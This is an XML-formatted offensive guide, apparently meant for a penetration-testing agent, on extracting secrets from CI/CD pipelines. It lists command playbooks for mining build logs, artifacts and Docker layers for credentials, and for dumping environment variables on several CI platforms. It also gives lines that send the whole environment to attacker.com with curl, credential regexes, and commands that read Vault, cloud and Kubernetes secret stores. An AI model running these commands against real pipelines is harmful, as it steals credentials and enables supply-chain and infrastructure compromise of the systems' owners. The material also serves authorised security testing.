<vulnerability_guide>
  <title>SECRETS IN CI/CD - ENVIRONMENT VARIABLE LEAKAGE AND EXTRACTION</title>

  <critical>CI/CD systems store and process sensitive credentials including API keys, deployment tokens, cloud credentials, and signing keys. These secrets are often exposed through environment variables, build logs, artifacts, and misconfigured pipelines. Secret extraction from CI/CD is a primary target for supply chain attacks and infrastructure compromise.</critical>

  <scope>
    - Environment variable exposure in build logs
    - Secrets in build artifacts and caches
    - Hardcoded credentials in CI configuration
    - Secret manager misconfigurations
    - Debug mode credential leakage
    - Cross-pipeline secret exposure
    - Third-party integration credential theft
  </scope>

  <methodology>
    1. **Enumerate secret sources**: Identify where secrets are stored and injected
    2. **Analyze build logs**: Search for accidentally logged credentials
    3. **Review artifacts**: Check for secrets in build outputs
    4. **Test secret access**: Verify if unauthorized access is possible
    5. **Extract secrets**: Use available vectors to obtain credentials
  </methodology>

  <advanced_techniques>
    <log_exposure>
      Extract secrets from build logs:
      {% raw %}
      # Common log exposure patterns

      # Debug output accidentally enabled
      - echo "DEBUG: API_KEY=$API_KEY"  # Logged
      - set -x  # Bash debug mode logs all commands with expansions

      # Error messages revealing secrets
      curl: (6) Could not resolve host: api.example.com?key=SECRET123
      Error: Invalid token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxx

      # Stack traces with environment
      java.lang.Exception: Config error
          at Config.load(Config.java:42)
          Environment: {AWS_SECRET_KEY=AKIAXXXXXXX, ...}

      # Package manager verbose mode
      npm ERR! //registry.npmjs.org/:_authToken=npm_xxxx

      # Search patterns in logs
      grep -iE "(api_key|secret|token|password|credential).*=" build.log
      grep -E "['\"]?[A-Za-z0-9_]+['\"]?\s*[:=]\s*['\"][^'\"]{20,}['\"]" build.log
      {% endraw %}
    </log_exposure>

    <artifact_exposure>
      Find secrets in build artifacts:
      {% raw %}
      # .env files included in artifacts
      - upload-artifact:
          path: ./dist  # May include .env files

      # Configuration files with secrets
      find . -name "*.env*" -o -name "config*.json" -o -name "settings*.yaml"

      # Node modules with credentials
      grep -r "api_key\|secret\|token" node_modules/.cache/

      # Docker image layers
      docker save image:tag | tar -xf -
      for layer in */layer.tar; do tar -tf $layer | grep -i secret; done

      # Build cache with secrets
      cat .npm/_cacache/content-v2/sha512/*/*

      # Source maps with hardcoded values
      grep -r "REACT_APP_" dist/*.js.map
      {% endraw %}
    </artifact_exposure>

    <env_extraction>
      Extract environment variables:
      {% raw %}
      # Dump all environment variables
      - env | sort
      - printenv
      - set  # Includes shell variables

      # Platform-specific
      # GitHub Actions
      - env | grep GITHUB_
      - cat $GITHUB_ENV

      # GitLab CI
      - env | grep CI_
      - cat $CI_PROJECT_DIR/.gitlab-ci.yml

      # Jenkins
      - env | grep -E "^(JENKINS_|BUILD_|JOB_)"

      # Azure DevOps
      - env | grep -E "^(SYSTEM_|BUILD_|AGENT_)"

      # CircleCI
      - env | grep CIRCLE_

      # Encode and exfiltrate
      - env | base64 | curl -d @- https://attacker.com/collect
      - env > /tmp/env.txt && curl -F "file=@/tmp/env.txt" https://attacker.com/upload
      {% endraw %}
    </env_extraction>

    <common_secret_patterns>
      Identify specific credential types:
      {% raw %}
      # AWS
      AKIAIOSFODNN7EXAMPLE  # Access Key ID (starts with AKIA)
      wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY  # Secret Key (40 chars)

      # GitHub
      ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  # Personal Access Token
      gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  # OAuth Token
      ghu_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  # User-to-server Token
      github_pat_xxxxxxxxx  # Fine-grained PAT

      # GitLab
      glpat-xxxxxxxxxxxxxxxxxxxx  # Personal Access Token

      # Slack
      xoxb-xxxx-xxxx-xxxx  # Bot Token
      xoxp-xxxx-xxxx-xxxx  # User Token

      # Stripe
      sk_live_xxxxxxxxxxxxxxxx  # Secret Key
      pk_live_xxxxxxxxxxxxxxxx  # Publishable Key

      # NPM
      npm_xxxxxxxxxxxxxxxxxxxxxxxx  # Auth Token

      # Docker Hub
      dckr_pat_xxxxxxxxxxxxxxxxxxxx  # Personal Access Token

      # Regex patterns
      AWS_KEY = /AKIA[0-9A-Z]{16}/
      GITHUB = /gh[pousr]_[A-Za-z0-9_]{36,}/
      PRIVATE_KEY = /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/
      JWT = /eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*/
      {% endraw %}
    </common_secret_patterns>

    <secret_manager_exploitation>
      Attack secret management systems:
      {% raw %}
      # HashiCorp Vault
      # If VAULT_TOKEN is exposed
      curl -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/production
      vault kv list secret/
      vault kv get secret/prod/database

      # AWS Secrets Manager
      # If AWS credentials are available
      aws secretsmanager list-secrets
      aws secretsmanager get-secret-value --secret-id prod/api-keys

      # Azure Key Vault
      az keyvault list
      az keyvault secret list --vault-name production-vault
      az keyvault secret show --vault-name production-vault --name api-key

      # GCP Secret Manager
      gcloud secrets list
      gcloud secrets versions access latest --secret=api-key

      # Kubernetes Secrets
      kubectl get secrets
      kubectl get secret production-secrets -o jsonpath='{.data}'
      echo "base64data" | base64 -d
      {% endraw %}
    </secret_manager_exploitation>

